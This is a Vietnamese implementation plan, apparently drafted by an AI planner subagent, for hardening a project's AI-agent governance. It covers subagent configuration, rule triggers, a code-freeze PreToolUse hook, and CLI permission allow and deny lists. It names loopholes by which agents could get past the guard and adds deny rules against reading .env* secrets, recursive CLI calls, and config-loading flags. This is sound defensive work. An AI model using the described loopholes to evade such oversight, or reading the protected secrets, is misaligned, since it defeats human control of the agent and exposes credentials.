# Kế Hoạch Triển Khai: Remake Hệ Thống Rules, Subagents, Hooks, Workflows & Skills (Vikini Governance 2.0 - Phương án A)

- **Revision**: 8
- **Status**: Completed
- **Date**: 2026-10-23
- **Author**: Subagent @planner ([PLANNER_MODEL: gemini-4-argon])

---

## Technical Plan

### 1. Mục Tiêu (Goal) & Out of Scope (What We're NOT Doing)

#### 1.1. Mục Tiêu (Goal)

Tái cấu trúc toàn diện hệ thống quản trị AI Agent của dự án **Vikini** (`.agents/`, `scripts/`, `docs/`) theo **Phương án A (Vikini Governance 2.0 — Clean Progressive Disclosure & Hardened Guard)** đã được đối chiếu độc lập bởi Claude Code CLI và tài liệu chính thức Google Antigravity tháng 10/2026 (`v2.24.0`), nhằm giải quyết triệt để 4 trụ cột:

1. **Chuẩn hóa Schema YAML Frontmatter, Model Roster Tháng 10/2026 & Khử Tự Đọc Thừa Cho Subagents (`.agents/agents/`)**:
   - Đổi `model: gemini-4-argon` / `model: claude-4.6-opus` sang giá trị hợp lệ `model: pro` của Antigravity Subagents YAML frontmatter (`model: inherit | flash | pro` theo `[URL]` `https://antigravity.google/docs/subagents.md`) và xóa trường `role:` không chuẩn trong YAML frontmatter của `.agents/agents/planner/agent.md`, `.agents/agents/reviewer/agent.md`, và `.agents/agents/qa/agent.md`.
   - **Đồng bộ chính xác Model Roster tháng 10/2026 & cơ chế runtime của `model: pro` (`M1`, `M2`)**:
     - Theo `[URL]` `https://antigravity.google/docs/models.md`, bảng Models chính thức đánh dấu `Claude Opus 4.6 (thinking)`, `Claude Sonnet 4.6 (thinking)` và `GPT-OSS-120b` bằng chú thích `* Will be removed on November 2, 2026`, trong khi 4 mô hình chủ lực khả dụng đầy đủ trên các gói trả phí (Google AI Pro, Ultra, Enterprise) là **`Gemini 4 Argon`** (`gemini-4-argon` — kèm chú thích `***`: _"Not available in Antigravity IDE. Available in the Antigravity App, Antigravity CLI, and IDE extensions"_), **`Gemini 3.8 Flash`** (`gemini-3.8-flash`), **`Claude Opus 5.5 (thinking)`** (`claude-opus-5-5`), và **`Claude Sonnet 5.5 (thinking)`** (`claude-sonnet-5-5`).
     - Làm rõ cơ chế kỹ thuật của `model: pro` trong `.agents/agents/qa/agent.md` và `.agents/README.md` (`M1`): Cấu hình `model: pro` trong YAML frontmatter của custom subagent chỉ chọn phân tầng `pro` của phiên làm việc hiện tại chứ **không tự động chuyển đổi nhà cung cấp (provider) từ Gemini sang Claude** (`antigravity-cli#1150`), và có thể bị ghi đè khi `invoke_subagent` truyền `Model: "inherit"` (`antigravity-cli#1195`). Do đó, trong `.agents/agents/qa/agent.md:131-137` và `.agents/README.md`, quy định rõ: khuyến nghị User/PM chọn `Claude Opus 5.5 (thinking)` (hoặc `Gemini 4 Argon`) trên thanh chọn model của Antigravity khi gọi `@qa`, và báo cáo nghiệm thu `@qa` bắt buộc ghi nhận **đúng model thực tế đang chạy trong phiên** (`[QA_MODEL: <active-runtime-model>]`, ưu tiên `claude-opus-5-5` hoặc fallback `gemini-4-argon`), đồng thời xóa bỏ hoàn toàn tham chiếu `claude-4.6-opus` cũ.
     - Trong `.agents/rules/01-coding.md:93`: đổi `(Claude Opus 4.6 / 5.5, Gemini 4 Argon, Gemini 3.1 Pro)` thành `(Gemini 4 Argon, Claude Opus 5.5, Claude Sonnet 5.5, Gemini 3.8 Flash)`.
   - **Loại bỏ lệnh tự đọc chính mình ở Bước 0 nhưng GIỮ bước đọc `.agents/rules/02-quality.md` (`M2`)**:
     - Loại bỏ hoàn toàn yêu cầu tự gọi `view_file` đọc lại `.agents/agents/planner/agent.md` ở Bước 0 của `@planner` (`.agents/agents/planner/agent.md:30`) và loại bỏ mục tự đọc `.agents/agents/reviewer/agent.md` ở Bước 0 của `@reviewer` (`.agents/agents/reviewer/agent.md:39`).
     - Để phòng thủ chiều sâu trước trường hợp custom subagent đôi khi bỏ sót project rules (`discuss.ai.google.dev/t/.../172904`), tại Bước 0 của `.agents/agents/planner/agent.md:30` **GIỮ NGUYÊN** yêu cầu đọc `.agents/rules/02-quality.md` (cùng các `SKILL.md` theo bảng Pre-Work Protocol và các file mã nguồn/tài liệu liên quan đến task).
   - Thu gọn `.agents/agents/reviewer/agent.md` từ `9,779 chars` (`11,602 bytes` — sát ngưỡng trần `10,000 chars`) xuống `< 7,500 chars`.
   - Thu hồi quyền `write_to_file` khỏi danh sách `tools:` của `.agents/agents/reviewer/agent.md` (chỉ giữ `replace_file_content` để Reviewer chỉ được phép sửa/append vào file kế hoạch đã tồn tại tại `docs/plans/*.md`, giữ nguyên `list_dir`, `find_by_name`, `grep_search`; ghi chú rõ sự tương thích với bí danh công cụ `edit_file`/`read_file`).

2. **Tối Ưu Context Engineering & Progressive Disclosure Cho `.agents/rules/` (`M3`, `M5`, `Minor 5`)**:
   - Giảm tổng dung lượng `always_on` rules từ `34,912 chars` (`37,423 bytes`) xuống `< 18,000 chars` mà vẫn bảo toàn 100% các quy tắc bắt buộc theo **Ma Trận Bảo Toàn Quy Chuẩn (Normative Rule Preservation Matrix)** tại Mục 6.4:
     - Giữ `trigger: always_on` cho 3 file cốt lõi: `.agents/rules/00-core.md` (`~4,500 chars`), `.agents/rules/02-quality.md` (`~6,500 chars`), `.agents/rules/05-plan-review.md` (`~6,500 chars`).
     - Chuyển `.agents/rules/01-coding.md` sang `trigger: glob` với `globs: "*.ts, *.tsx, *.js, *.mjs, **/*.ts, **/*.tsx, **/*.js, **/*.mjs"` (`M3`). Tích hợp mục **Core Coding & Testing Invariants** (~1,000 ký tự) vào `.agents/rules/00-core.md` (`always_on`).
     - Chuyển `.agents/rules/03-ui.md` sang `trigger: glob` với `globs: "*.tsx, *.css, **/*.tsx, **/*.css"` (`M3`). Giữ `.agents/rules/04-bilingual.md` làm Single Source of Truth cho quy chuẩn song ngữ (sửa đường dẫn dòng 14 từ `lib/utils/translations/` ➔ `src/lib/utils/translations/`) và chỉ bổ sung 1 dòng tham chiếu ngắn tại cuối `.agents/rules/03-ui.md` (`Minor 5`).
     - Chuẩn hóa quy tắc Git trong `.agents/rules/00-core.md`: phân biệt rõ **BANNED mutating git commands** và **ALLOWED read-only git inspection**, đồng bộ 100% với `.agents/scripts/code-freeze-guard.js`.

3. **Gia Cố Bảo Mật Đa Lớp (Defense-in-Depth) Cho `.agents/scripts/run-claude.ps1`, `.agents/scripts/code-freeze-guard.js`, `.agents/hooks.json`, Allowlist & Unit Tests (`BLK-02`..`BLK-04`, `MAJ-04`..`MAJ-12`, `MIN-04`..`MIN-07`)**:
   - **Đóng toàn bộ vector thực thi code tùy ý & rò rỉ secrets trên cả kênh Antigravity và kênh Claude Code CLI bằng 4 Lớp Phòng Thủ Chiều Sâu (`BLK-02`, `BLK-03`, `BLK-04`, `MAJ-04`, `MAJ-05`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-05`..`MIN-07`)**:
     - Tài liệu chính thức của Claude Code (`[URL]` `https://code.claude.com/docs/en/permissions`, `https://code.claude.com/docs/en/hooks`) khẳng định: (a) các quy tắc wildcard `Bash(...)` đơn lẻ không phải là ranh giới bảo mật tuyệt đối (_"isn't a security boundary"_), (b) khi `PreToolUse` hook trả về `permissionDecision: "allow"`, Claude Code sẽ bỏ qua bước kiểm tra `--allowedTools` và chế độ auto-deny của `dontAsk` (`BLK-04`), trong khi hành vi _"Exit code 0 with no output means the hook has no decision to report, so the tool call continues through the normal permission flow"_ là nhất quán tuyệt đối 100% trên mọi chế độ bao gồm `-p` (`MAJ-12`), và (c) khi hook cần chặn (`deny`/`ask`), JSON trả về của `PreToolUse` chỉ hợp lệ khi dùng đối tượng `hookSpecificOutput` (không có trường `decision` ở cấp gốc) kèm `"onFailure": "block"` trong cấu hình hook (`MAJ-10`). Do đó, tại `.agents/scripts/run-claude.ps1` và `.agents/scripts/code-freeze-guard.js`, triển khai đồng bộ **4 lớp phòng thủ (4-Layer Defense-in-Depth)**:
       - **Lớp 1 — Gắn `code-freeze-guard.js` làm `PreToolUse` hook (`"onFailure": "block"`): khi `allow` thì thoát `exit 0` không in stdout (`null`), khi chặn thì trả `hookSpecificOutput` chuẩn schema (`BLK-03`, `BLK-04`, `MAJ-10`, `MAJ-12`, `MIN-06`)**:
         - Trong `run-claude.ps1`, truyền `--settings $claudeHookSettings` vào `claude -p` với cấu hình JSON `PreToolUse` (`matcher: "Write|Edit|MultiEdit|Bash|Read"`, `command: "node .agents/scripts/code-freeze-guard.js"`, `"onFailure": "block"` — `MAJ-10`).
         - Trong `.agents/scripts/code-freeze-guard.js`: (a) cập nhật `extractInput(payload)` nhận thêm `args.new_string` / `args.old_string` của công cụ `Edit` trên Claude CLI; (b) bổ sung và export hàm `formatHookOutput(result, rawPayload)`: khi `rawPayload?.hook_event_name === "PreToolUse"`, nếu `result.decision === "allow"` thì trả về **`null`** (để `main()` **không in gì ra stdout và thoát `exit 0`**, cho phép lệnh đi tiếp vào luồng kiểm tra `--allowedTools` + `--disallowedTools` + `dontAsk` chuẩn của Claude Code mà không bao giờ gây lỗi thoát mã 2 trong `-p` — `BLK-04`, `MAJ-12`); nếu `result.decision !== "allow"` thì trả về `{ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: rawPayload.permission_mode === "dontAsk" ? "deny" : "ask", ...(result.reason ? { permissionDecisionReason: result.reason } : {}) } }` (không spread `...result`, không có trường `decision` cấp gốc — `MAJ-10`).
       - **Lớp 2 — Chỉ cho phép file `.md` trên toàn bộ `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES`, thu hẹp `Edit(docs/plans/\*.md)` (`BLK-03`, `BLK-04`, `MAJ-04`)\*\*:
         - Trong `run-claude.ps1`: thu hẹp `Edit(docs/plans/**)` thành **`Edit(docs/plans/*.md)`** cho cả `planner` và `reviewer` (và giữ `Write` trần trong `--disallowedTools` của `reviewer` để thu hồi công cụ `Write` — `MAJ-04`).
         - Trong `code-freeze-guard.js` (Gate 3 `if (unfrozen)`): mở rộng kiểm tra đuôi `.md` cho **toàn bộ `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES`** (`BLK-04`): nếu `!relative.toLowerCase().endsWith(".md")`, lập tức trả về `ask("⚠️ Code Freeze Guard: only .md files are allowed inside unfrozen documentation paths (${relative}).")`. Điều này chặn hoàn toàn việc tạo `docs/notes/x.test.mjs`hoặc`docs/plans/x.test.mjs` trên cả kênh Antigravity lẫn kênh Claude Code CLI.
       - **Lớp 3 — Thêm dấu cách tường minh trước `*` cho mọi rule tiền tố trong `$sharedAllowedBash` (`BLK-03`, `MAJ-05`)**:
         - Trong `run-claude.ps1`, sửa toàn bộ các rule tiền tố trong `$sharedAllowedBash` để có dấu cách trước `*` (kèm cặp lệnh không tham số tương ứng): `Bash(npm run type-check),Bash(npm run lint),Bash(npm run test:run),Bash(npm run test:run *),Bash(npm run verify),Bash(npx tsc --noEmit),Bash(npx tsc --showConfig),Bash(npx eslint --print-config *),Bash(npx vitest run *),Bash(npx vitest list --filesOnly),Bash(node scripts/verify-docs.mjs),Bash(node scripts/verify-docs.mjs *),Bash(npm ls),Bash(npm ls *),Bash(npm view *),Bash(git status),Bash(git status *),Bash(git log *),Bash(git diff *),Bash(git show *),Bash(git blame *)`. Nhờ dấu cách trước `*`, `Bash(git diff *)` không bao giờ khớp `git difftool`.
       - **Lớp 4 — Chặn các cờ nạp code/config (neo ranh giới khoảng trắng cho cờ ngắn `-c`, `-u`, `-i`), cờ ghi file, lệnh gọi đệ quy CLI & chặn đọc secrets `.env*` (`BLK-02`, `BLK-03`, `MAJ-08`, `MIN-06`, `MIN-07`)**:
         - Trong `MUTATING_FLAGS` (`code-freeze-guard.js:71` — `BLK-03`, `MIN-07`): neo ranh giới khoảng trắng/đầu chuỗi cho các cờ ngắn `-c`, `-u`, `-i` để không chặn nhầm tên file có dấu gạch nối như `batch-c.test.ts`: `/(?:^|\s)(?:--fix|--write|--force|--output|--outputFile|--config|--root|--dir|--globalSetup|--setupFiles|--extcmd|--update|--coverage)(?:\s|=|$)|(?:^|\s)-(?:c|u|i)(?:\s|=|$)/`.
         - Trong `$sharedDisallowed` (`run-claude.ps1`): bổ sung `Read(.env*),Read(**/.env*)` (chặn đọc `.env.local` và mọi file `.env*` — `MAJ-08`), `Edit(src/**),Edit(.agents/**),Edit(scripts/**),Edit(supabase/**),Edit(tests/**)` (`MAJ-04`), `Bash(powershell *),Bash(pwsh *),Bash(claude *)` (`MIN-06`), `Bash(git difftool*),Bash(* --config*),Bash(* -c *),Bash(* --root*),Bash(* --dir*),Bash(* --globalSetup*),Bash(* --setupFiles*),Bash(* --extcmd*)` (`BLK-03`), `Bash(git * --output*),Bash(* --output=*),Bash(* --output *),Bash(* --outputFile*),Bash(* --fix*),Bash(* --write*),Bash(* -u),Bash(* -u *),Bash(* --update*),Bash(* --coverage*)` (`BLK-02`), cùng toàn bộ lệnh git mutating.
         - Trong `decide()` (`code-freeze-guard.js`): bổ sung kiểm tra đối với công cụ đọc file (`Read`, `read_file`, `view_file`) ở đầu nhánh `if (input.targetFile)`: nếu tên file khớp `/^\.env(?:\..+)?$/i` (hoặc `relative.startsWith(".env") || relative.includes("/.env")`), trả về `ask("⚠️ Code Freeze Guard: reading .env* secret files is prohibited...")`; ngược lại với các file thường thì trả về `{ decision: "allow" }` (`MAJ-08`).
     - Kiểm tra hợp lệ tham số `-ArtifactFile` trong `run-claude.ps1` (`B1`, `MIN-05`): bắt buộc `[System.IO.Path]::IsPathRooted($ArtifactFile)` (nếu tương đối báo lỗi `[INVALID_ARTIFACT_PATH]` và `exit 43`), phân giải `$resolvedArtifactFile` nằm trong `$env:USERPROFILE\.gemini\antigravity\brain\` (không chứa `..`, đuôi `.md`), và sử dụng `$resolvedArtifactFile` ở tất cả các bước `Split-Path -Parent $resolvedArtifactFile`, `New-Item`, và `Copy-Item -LiteralPath $relPlanFile -Destination $resolvedArtifactFile -Force`.
   - **Hỗ trợ song song tên công cụ mới (`write_file`, `edit_file`, `read_file`) và tên công cụ hiện hành (`write_to_file`, `replace_file_content`, `multi_replace_file_content`, `view_file`)**:
     - Cập nhật `.agents/hooks.json`, `extractInput(payload)`, `isFastTrackEligible(relative, input)`, và Gate 3 `decide()`.
   - **Xóa bỏ nhánh bypass `.agents/.plan-approved`, Giữ nguyên chữ ký `export function isPlanApproved()` dùng `REPO_ROOT` (`MAJ-09`) & Vá lỗ hổng Stale/Completed Plan Unlock bằng `evaluateLatestDateGroupPlans` ở bước cuối cùng (`MAJ-06`, `MAJ-07`, `MAJ-11`, `MIN-04`)**:
     - **Xóa bỏ hoàn toàn nhánh đọc `.agents/.plan-approved`** khỏi `export function isPlanApproved()` (sử dụng `path.join(REPO_ROOT, "docs", "plans")` khớp 100% với `.agents/scripts/code-freeze-guard.js:33,176` và `.agents/scripts/code-freeze-guard.test.ts:12,595-598` — `MAJ-07`, `MAJ-09`), giữ `docs/plans/*.md` làm **Single Source of Truth duy nhất** (và **không** thêm `.agents/.plan-approved` vào `.gitignore`).
     - Xây dựng và export bộ hàm thuần dùng chung: `hasApprovedPlanHeader`, `hasApprovedPlanFooter`, `hasCompletedPlanHeader`, `evaluatePlanApprovalContent`, `isSelfForgedPlanWrite`, `evaluateLatestDateGroupPlans(planEntries, options)`, và `formatHookOutput(result, rawPayload)`.
     - Trong `evaluateLatestDateGroupPlans(planEntries, options)` (`MAJ-06`, `MAJ-11`, `MIN-04`): trích xuất tiền tố ngày `YYYY-MM-DD`, lọc bỏ mọi file có `datePrefix > maxDatePrefix` (`UTC today + 1 day` — `MIN-04`), sắp xếp giảm dần theo `datePrefix` trước rồi mới dùng `mtimeMs` làm tie-breaker, và khóa fail-safe nếu có bất kỳ kế hoạch nào trong nhóm ngày mới nhất chưa `Completed` và chưa `Approved`. Để tránh việc file untracked `docs/plans/2026-10-23-strata-local-llm-implementation-plan.md` (`Status: Ready for Review`) làm khóa repo giữa chừng trước khi sửa `.gitignore` và `scripts/verify-docs.mjs` (`MAJ-11`), việc cập nhật `code-freeze-guard.js` được đặt ở **Bước 5 (sau cùng)**, tiếp theo là đóng `- **Status**: Completed` cho toàn bộ **4 file kế hoạch ngày `2026-10-19`** để `isPlanApproved()` tất định trả về `false` trong mọi trường hợp.

4. **Hợp Nhất `.agents/workflows/` Vào `.agents/skills/`, Xử Lý Doc Drift, Archive `docs/CHANGELOG.md` (Bước 4) & Đóng `Completed` Cho Cả 4 Kế Hoạch Ngày `2026-10-19` (Cuối Bước 5) (`MAJ-06`, `MAJ-07`, `MAJ-11`, `MIN-03`)**:
   - Chuyển đổi `.agents/workflows/debug.md` + `.agents/workflows/post-fix.md` thành `.agents/skills/vikini-debug/SKILL.md` và `.agents/workflows/audit.md` thành `.agents/skills/vikini-audit/SKILL.md`; xóa thư mục `.agents/workflows/`.
   - Tại **Bước 4** (trước khi thay đổi logic `isPlanApproved()` trong `code-freeze-guard.js` — `MAJ-11`): cập nhật `.gitignore` (`!.agents/skills/vikini-debug/`, `!.agents/skills/vikini-audit/`), cập nhật `scripts/verify-docs.mjs`, sửa doc drift trong `.agents/skills/*`, `.agents/README.md`, `.agents/scripts/claude-planner-prompt.md`, `docs/lessons-learned.md`, và lưu trữ 32 mục changelog cũ (`<= 2026-10-15`, dòng 122–847) từ `docs/CHANGELOG.md` sang `docs/archive/CHANGELOG-legacy.md` để `node scripts/verify-docs.mjs --strict-shorthand --expected-headings=113` đạt **PASS 5/5 (`exit 0`)**.
   - Tại **Cuối Bước 5** (`MAJ-06`, `MAJ-11`), cập nhật `- **Status**: Completed` cho toàn bộ **4 file kế hoạch ngày `2026-10-19`** (`pstack-skills-and-fast-track`, `swap-planner-reviewer-workflow`, `vitest-upgrade-and-add-model-skill`, và `remake-agents-governance-v2`) cùng bảng `docs/plans/README.md`, đảm bảo `isPlanApproved()` trả về `false` bất kể file untracked `2026-10-23-strata-local-llm-implementation-plan.md` còn hay đã được dời đi.

#### 1.2. Out of Scope (What We're NOT Doing)

- **KHÔNG** thay đổi bất kỳ mã nguồn runtime hay logic nghiệp vụ nào trong `src/app/`, `src/lib/`, hoặc `src/components/`.
- **KHÔNG** gộp 3 file vệ tinh của Reviewer (`allowlist.md`, `evidence-bar.md`, `mental-simulation.md`) vào 1 file duy nhất.
- **KHÔNG** xóa file `.agents/rules/04-bilingual.md` và **KHÔNG** sao chép lặp lại nội dung của `04-bilingual.md` vào `03-ui.md`.
- **KHÔNG** bỏ chặn (`!`) trong `.gitignore` đối với 3 thư mục skill của bên thứ ba (`animation-vocabulary`, `emil-design-eng`, `review-animations`) và **KHÔNG** thêm `.agents/.plan-approved` vào `.gitignore` (`MAJ-07`).
- **KHÔNG** cài đặt thêm hoặc nâng cấp bất kỳ dependency nào trong `package.json`.
- **KHÔNG** sửa đổi nội dung kỹ thuật lịch sử trong `docs/plans/2026-*.md` của các task trước (ngoại trừ việc cập nhật dòng trạng thái `- **Status**: Completed` ở Header của 3 file kế hoạch cùng ngày `2026-10-19` đã triển khai xong gồm `2026-10-19-pstack-skills-and-fast-track-implementation-plan.md`, `2026-10-19-swap-planner-reviewer-workflow-implementation-plan.md`, và `2026-10-19-vitest-upgrade-and-add-model-skill.md` ở bước cuối cùng — `MAJ-06`).

---

### 2. Tài Liệu Cần Tham Chiếu (Pre-Work Reading) & Skills Loaded & Applied

#### 2.1. Bảng Tài Liệu Đã Đọc (Pre-Work Reading)

| Tài liệu / File                                                             | Trạng thái | Ghi chú & Phát hiện chính                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| :-------------------------------------------------------------------------- | :--------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `.agents/rules/00-core.md`                                                  |   Đã đọc   | `3,543 chars`. Chứa mâu thuẫn quy tắc Git (cấm mọi lệnh git ở dòng 42, 55 nhưng `code-freeze-guard.js:62` cho phép git read-only).                                                                                                                                                                                                                                                                                                                                                         |
| `.agents/rules/01-coding.md`                                                |   Đã đọc   | `9,576 chars`. Đang để `trigger: always_on`; dòng 93 còn liệt kê model cũ `Claude Opus 4.6 / 5.5, Gemini 4 Argon, Gemini 3.1 Pro`.                                                                                                                                                                                                                                                                                                                                                         |
| `.agents/rules/02-quality.md`                                               |   Đã đọc   | `11,044 chars`. Tham chiếu `.agents/workflows/` tại 5 vị trí: dòng 19 (`debug.md`), dòng 30 (`audit.md`), dòng 41 (`.agents/workflows/`), dòng 99 (`audit.md`), dòng 140 (`debug.md`); dòng 108 ghi `- Chuẩn API Route Architecture: .agents/skills/api-patterns/SKILL.md (Validate → Execute → Respond, requireUser()).`.                                                                                                                                                                 |
| `.agents/rules/03-ui.md`                                                    |   Đã đọc   | `6,034 bytes`. Đang để `trigger: model_decision`, chưa tự động kích hoạt theo glob `*.tsx, *.css, **/*.tsx, **/*.css`.                                                                                                                                                                                                                                                                                                                                                                     |
| `.agents/rules/04-bilingual.md`                                             |   Đã đọc   | `1,724 bytes`. Dòng 14 ghi sai đường dẫn `lib/utils/translations/` (thiếu tiền tố `src/`).                                                                                                                                                                                                                                                                                                                                                                                                 |
| `.agents/rules/05-plan-review.md`                                           |   Đã đọc   | `10,749 chars`. Dòng 60 cấp `write_to_file` cho `@reviewer`; chưa quy định bước chuyển `Status: Completed` để khóa lại repo sau khi xong task.                                                                                                                                                                                                                                                                                                                                             |
| `.agents/agents/planner/agent.md`                                           |   Đã đọc   | `10,562 bytes`. Dòng 4–5 dùng `model: gemini-4-argon` và `role:`; dòng 30 bắt tự đọc lại `planner/agent.md`; dòng 57 trỏ vào `.agents/workflows/debug.md`.                                                                                                                                                                                                                                                                                                                                 |
| `.agents/agents/reviewer/agent.md`                                          |   Đã đọc   | `9,779 chars` (`11,602 bytes` — 97.8% ngưỡng trần `10,000 chars`). Dòng 4–5 sai schema YAML; dòng 16 cấp thừa `write_to_file`; dòng 39 bắt tự đọc lại `reviewer/agent.md`; dòng 82 gợi ý `node -e` / `npx tsx -e`.                                                                                                                                                                                                                                                                         |
| `.agents/agents/reviewer/allowlist.md`                                      |   Đã đọc   | Dòng 19 gợi ý pipe `\| npx eslint --stdin`; dòng 22–25 gợi ý `node -e` và `npx tsx -e` (đều bị `code-freeze-guard.js` chặn).                                                                                                                                                                                                                                                                                                                                                               |
| `.agents/agents/reviewer/evidence-bar.md`                                   |   Đã đọc   | Dòng 21 gợi ý `node -e` / `npx tsx -e`; dòng 49 gợi ý pipe `\| npx eslint --stdin`.                                                                                                                                                                                                                                                                                                                                                                                                        |
| `.agents/agents/reviewer/mental-simulation.md`                              |   Đã đọc   | 63 dòng, chuẩn xác, không có drift.                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| `.agents/agents/qa/agent.md`                                                |   Đã đọc   | Dòng 4–5 dùng `model: claude-4.6-opus` và `role:` không hợp lệ trong YAML frontmatter; dòng 133 dùng model sắp ngừng hỗ trợ `claude-4.6-opus` (thay bằng cơ chế ghi nhận runtime model thực tế, ưu tiên `claude-opus-5-5` hoặc fallback `gemini-4-argon`).                                                                                                                                                                                                                                 |
| `.agents/hooks.json`                                                        |   Đã đọc   | Dòng 5 `matcher` thiếu `multi_replace_file_content`, `write_file`, `edit_file`; dòng 9 gọi `node scripts/code-freeze-guard.js`.                                                                                                                                                                                                                                                                                                                                                            |
| `.agents/scripts/code-freeze-guard.js`                                      |   Đã đọc   | 726 dòng (ES Module). Dòng 33 export `REPO_ROOT`, dòng 176 export `isPlanApproved()` (`MAJ-09`); dòng 39 `UNFROZEN_PREFIXES = ["docs/"]` cho phép tạo file `.mjs` trong `docs/**` (`BLK-04`); dòng 176–191 chứa nhánh `.agents/.plan-approved` (`MAJ-07`); lỗ hổng `isPlanApproved()` (dòng 193–236); thiếu Single-Step Pre-Approved Plan Guard, chặn đọc `.env*` (`MAJ-08`), và `formatHookOutput` trả `null` khi `allow` / `hookSpecificOutput` khi chặn (`BLK-04`, `MAJ-10`, `MAJ-12`). |
| `.agents/scripts/code-freeze-guard.test.ts`                                 |   Đã đọc   | 987 dòng, 92 unit tests đang pass (dòng 12 import `isPlanApproved` và dòng 595–598 gọi `isPlanApproved()` — `MAJ-09`).                                                                                                                                                                                                                                                                                                                                                                     |
| `.agents/scripts/run-claude.ps1`                                            |   Đã đọc   | 196 dòng. Dòng 140, 149 cấp `Bash(npm:*,git:*,npx:*,node:*)` và `Write` không giới hạn đường dẫn kèm `--dangerously-skip-permissions` ở dòng 153; chưa gắn `code-freeze-guard.js` qua `--settings` với `"onFailure": "block"` (`BLK-03`, `MAJ-10`); dòng 182–193 `Copy-Item -Destination $ArtifactFile` dùng `$ArtifactFile` thô chưa kiểm tra `IsPathRooted` (`MIN-05`).                                                                                                                  |
| `.agents/scripts/claude-planner-prompt.md`                                  |   Đã đọc   | 84 dòng. Dòng 20 thiếu liệt kê `vikini-debug`, `vikini-audit`, `add-model`; dòng 64 tham chiếu `.agents/workflows/debug.md`.                                                                                                                                                                                                                                                                                                                                                               |
| `.agents/scripts/claude-reviewer-prompt.md`                                 |   Đã đọc   | 52 dòng. Chuẩn xác, đồng bộ với quy tắc `Status: Approved` và `[PLAN_APPROVED]`.                                                                                                                                                                                                                                                                                                                                                                                                           |
| `.agents/workflows/*.md`                                                    |   Đã đọc   | `debug.md` (54 dòng), `post-fix.md` (39 dòng), `audit.md` (55 dòng) — sẽ hợp nhất vào `.agents/skills/vikini-debug/SKILL.md` và `.agents/skills/vikini-audit/SKILL.md`.                                                                                                                                                                                                                                                                                                                    |
| `scripts/verify-docs.mjs`                                                   |   Đã đọc   | 303 dòng (ES Module). Kiểm tra 5 cổng chất lượng tài liệu; hiện đang FAIL ở cổng `[5/5]` do `docs/CHANGELOG.md` vượt trần `35,000 bytes` (`130,991 bytes`).                                                                                                                                                                                                                                                                                                                                |
| `docs/CHANGELOG.md` & `docs/archive/CHANGELOG-legacy.md`                    |   Đã đọc   | `docs/CHANGELOG.md` có 38 headings (`130,991 bytes`); `docs/archive/CHANGELOG-legacy.md` có 74 headings (`106,402 bytes`). Tổng cộng 112 headings hiện hữu (113 headings sau khi thêm mục changelog của task này).                                                                                                                                                                                                                                                                         |
| `docs/plans/2026-10-19-*.md` (4 files), `2026-10-23-strata-*` & `README.md` |   Đã đọc   | Cả 3 plan trước trong ngày `2026-10-19` (`pstack`, `swap`, `vitest`) đang `Status: Approved` + `[PLAN_APPROVED]` (`MAJ-06`); ngoài ra có 1 file untracked `docs/plans/2026-10-23-strata-local-llm-implementation-plan.md` đang `Status: Ready for Review` (`MAJ-11`).                                                                                                                                                                                                                      |
| `https://code.claude.com/docs/en/permissions` & `hooks`                     |   Đã đọc   | Tài liệu Permissions & Hooks của Claude Code xác nhận: (1) _"Exit code 0 with no output means the hook has no decision to report, so the tool call continues through the normal permission flow"_ (`BLK-04`, `MAJ-12`), (2) khi chặn, `PreToolUse` JSON chỉ nhận `hookSpecificOutput` (không nhận `decision` cấp gốc) kèm `"onFailure": "block"` (`MAJ-10`), (3) `Edit(docs/plans/*.md)` + `Read(.env*)` (`BLK-03`, `MAJ-08`).                                                             |

#### 2.2. Bảng Skills Loaded & Applied

| Skill (`SKILL.md` đã đọc bằng `view_file`)   | Lý do kích hoạt theo `.agents/rules/02-quality.md`                                                                                                           | Quyết định kỹ thuật chịu ảnh hưởng trực tiếp trong Kế hoạch                                                                                                                                                                                                                                                                                                                                                                                                |
| :------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `.agents/skills/vikini-investigate/SKILL.md` | Khảo sát kiến trúc tổng thể hệ thống `.agents/`, `scripts/`, `docs/` trước khi tái cấu trúc.                                                                 | Áp dụng quy trình đối chiếu chéo toàn bộ callers/references của `.agents/workflows/`, `isPlanApproved()` (`REPO_ROOT`), `run-claude.ps1`, các file kế hoạch trong `docs/plans/` (4 file `2026-10-19-*.md` + 1 file untracked `2026-10-23-strata-*.md` — `MAJ-11`), model names (`claude-4.6-opus`, `Gemini 3.1 Pro`) và `verify-docs.mjs`.                                                                                                                 |
| `.agents/skills/vikini-simplify/SKILL.md`    | Tinh giản hệ thống Rules & Subagents (Subtract Before You Add) để giảm tải ngữ cảnh `always_on`.                                                             | Loại bỏ bước tự đọc lại chính mình (`planner/agent.md` và `reviewer/agent.md`) ở Bước 0 của `@planner` và `@reviewer`; xóa bỏ nhánh dư thừa `.agents/.plan-approved` trong `isPlanApproved()`; thu gọn `.agents/agents/reviewer/agent.md` xuống `< 7,500 chars`; chuyển `01-coding.md` và `03-ui.md` sang `trigger: glob` kèm Ma Trận Bảo Toàn Quy Chuẩn (Mục 6.4); hợp nhất `.agents/workflows/` vào `.agents/skills/`.                                   |
| `.agents/skills/api-patterns/SKILL.md`       | Đối chiếu chuẩn xác thực API route thực tế của dự án để xử lý doc drift trong `.agents/rules/02-quality.md` và `.agents/skills/README.md`.                   | Xác nhận chuẩn xác thực mặc định trong `.agents/skills/api-patterns/SKILL.md:49-50` là `await auth()` kết hợp `UnauthorizedError` (hiện dùng tại 28 route files), bên cạnh helper `requireUser()` (`src/app/api/conversations/auth.ts:25`, hiện dùng tại 8 route files thuộc `conversations/`, `files/`, `messages/`, `user-templates/`). Cập nhật `.agents/rules/02-quality.md:108` và `.agents/skills/README.md:17,47` không ghi cứng con số (`MIN-03`). |
